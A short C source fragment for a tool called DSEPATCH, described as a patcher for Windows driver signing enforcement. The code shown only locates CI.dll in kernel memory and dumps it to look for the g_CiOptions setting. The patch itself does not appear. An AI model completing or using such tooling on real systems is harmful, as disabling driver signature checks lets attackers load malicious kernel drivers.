/*!
 * DSEPATCH (c) Driver Signing Enforcement 
 * Patcher for anything from Windows 8 to
 * present.
!*/
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>
#include "util.h"


int main(int argc, char **argv)
{
  LPVOID CiImagepMem   = NULL;
  LPVOID CiImageBase   = NULL;
  DWORD  CiOptionsLen  = 0;

  CiImageBase = KeGetBase("CI.dll", &CiOptionsLen);
  if ( (CiImageBase != NULL) )
  {
    /*!
     * Next, we dump the PE into the new buffer
     * we control. We parse that buffer to look
     * for CI!g_CiOptions.
    !*/
    printf("[*] Dumping %p from memory.\n", CiImageBase);
    CiImagepMem = KeDumpImage(CiImageBase, CiOptionsLen);
  };
};
